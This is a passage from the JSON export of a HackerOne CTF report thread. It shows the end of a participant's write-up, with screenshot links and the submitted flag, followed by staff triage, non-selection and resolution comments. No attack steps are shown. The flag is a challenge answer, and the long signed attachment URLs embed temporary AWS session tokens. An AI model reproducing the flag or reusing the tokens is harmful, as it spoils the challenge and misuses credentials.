lcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=21a9404493e7d588c0adf566fb5b5016bda5703a7b240b8472f07d3f6318cbd2\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7q1BPTY3DQ3V2Aw4WnpyoxUS?response-content-disposition=attachment%3B%20filename%3D%22bountypay-completed.png%22%3B%20filename%2A%3DUTF-8%27%27bountypay-completed.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=21a9404493e7d588c0adf566fb5b5016bda5703a7b240b8472f07d3f6318cbd2\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eFlag is: \u003ccode\u003e^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThanks again for this great and long challenge! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-09T19:31:11.243Z","updated_at":"2020-06-09T19:31:11.243Z","actor":{"username":"shakedko","cleared":false,"url":"/shakedko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ak1oSZijBCAPDuMVcNi2Mosb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":861142,"filename":"bountypay-completed.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7q1BPTY3DQ3V2Aw4WnpyoxUS?response-content-disposition=attachment%3B%20filename%3D%22bountypay-completed.png%22%3B%20filename%2A%3DUTF-8%27%27bountypay-completed.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070744Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026X-Amz-Signature=21a9404493e7d588c0adf566fb5b5016bda5703a7b240b8472f07d3f6318cbd2"},{"id":861127,"filename":"bountypay-done.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GjKCSTFko2befDWvBiNmtHtb?response-content-disposition=attachment%3B%20filename%3D%22bountypay-done.png%22%3B%20filename%2A%3DUTF-8%27%27bountypay-done.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070744Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026X-Amz-Signature=84bac88b22f35cd52e0f1cd4a6630b82403abc0fe79892b9fab0e7bcf522c628"},{"id":861126,"filename":"twotemplates.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tTTnPzRZZZq3rzeZejP6Vctv?response-content-disposition=attachment%3B%20filename%3D%22twotemplates.png%22%3B%20filename%2A%3DUTF-8%27%27twotemplates.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070744Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026X-Amz-Signature=262774fde79abc02c6bd51930d08a15a821136e769de4bec13d34a94c2a8dde0"},{"id":861125,"filename":"application-users.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/aSUcBZ8JdnAaFmt6SuMpsPFZ?response-content-disposition=attachment%3B%20filename%3D%22application-users.png%22%3B%20filename%2A%3DUTF-8%27%27application-users.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070744Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026X-Amz-Signature=3def53ebf48ac4cb30683a998b25ab2313efb1486bdfc93d302c866b57aca82b"},{"id":861124,"filename":"payment-2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VdyhNNB8fZ8DE9KEnRH3MXsy?response-content-disposition=attachment%3B%20filename%3D%22payment-2.png%22%3B%20filename%2A%3DUTF-8%27%27payment-2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070744Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026X-Amz-Signature=9ce79da59c179f7f98227ec2e8edddcf751c0160db23dad5e99ddb5aadd86fcd"},{"id":861123,"filename":"payment-1.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iqpwzLA5a4kEQPGQNh44jU93?response-content-disposition=attachment%3B%20filename%3D%22payment-1.png%22%3B%20filename%2A%3DUTF-8%27%27payment-1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070744Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026X-Amz-Signature=6f7b8a40fa3636dde7be816a3da0db75a1c642f4eb10c81810558af876dbf478"},{"id":861122,"filename":"payment-3.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MKmQWT9EQRdR6EEnL4FNXQF2?response-content-disposition=attachment%3B%20filename%3D%22payment-3.png%22%3B%20filename%2A%3DUTF-8%27%27payment-3.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070744Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026X-Amz-Signature=a7f466160b1a3051f089041ef0f6688dd4ff8e3e734849558ce404d3203e51b4"}],"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8247228,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-09T20:15:43.299Z","updated_at":"2020-06-09T20:15:43.299Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8268315,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\n\nWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!\n\nIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\u003c/p\u003e\n\n\u003cp\u003eWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we\u0026#39;ll make sure to let you know when you can publish them on your site!\u003c/p\u003e\n\n\u003cp\u003eIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-11T23:03:06.611Z","updated_at":"2020-06-11T23:03:06.611Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8324968,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for participating in the #h12006 CTF! ","markdown_message":"\u003cp\u003eThank you again for participating in the #h12006 CTF! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-17T22:28:17.048Z","updated_at":"2020-06-17T22:28:17.048Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"shakedko","url":"/shakedko"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8343078,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any chance to disclose \u0026 make public? \n\nThank you!","markdown_message":"\u003cp\u003eAny chance to disclose \u0026amp; make public? \u003c/p\u003e\n\n\u003cp\u003eThank 